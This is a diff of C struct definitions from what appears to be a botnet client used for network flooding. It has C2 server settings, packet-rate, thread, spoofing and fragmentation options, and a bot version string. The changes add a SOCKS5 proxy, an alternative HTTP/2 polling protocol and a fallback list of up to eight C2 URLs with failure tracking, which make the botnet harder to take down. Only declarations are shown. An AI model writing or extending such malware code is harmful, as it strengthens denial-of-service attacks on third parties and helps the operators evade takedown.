@@ -58,11 +58,18 @@ typedef struct {
     int c2_port;
     char c2_path[256];
     int use_ssl;
+    char socks5_proxy[256]; /* "ip:port" or empty */
+    int protocol;           /* 0=websocket, 1=http2-poll (gRPC-lite) */
     int heartbeat_int;
     int reconnect_min, reconnect_max, stale_timeout;
     unsigned int default_pps, default_threads;
     unsigned int spoof_mode, fragmentation;
     char bot_version[32];
+    /* Multi-C2 fallback list */
+    char c2_list[8][512];  /* up to 8 C2 URLs */
+    int c2_count;
+    int c2_current;        /* index of current C2 */
+    int c2_fail_count;     /* consecutive failures on current C2 */
 } Config;
 
 typedef struct {
@@ -176,6 +183,7 @@ typedef struct {
     SSL_CTX *ctx;
     char host[256], path[256];
     int port, use_ssl;
+    char socks5[256]; /* "ip:port" SOCKS5 proxy, or empty */
     pthread_mutex_t io;
     unsigned char rbuf[8192];
     int rbuf_len;
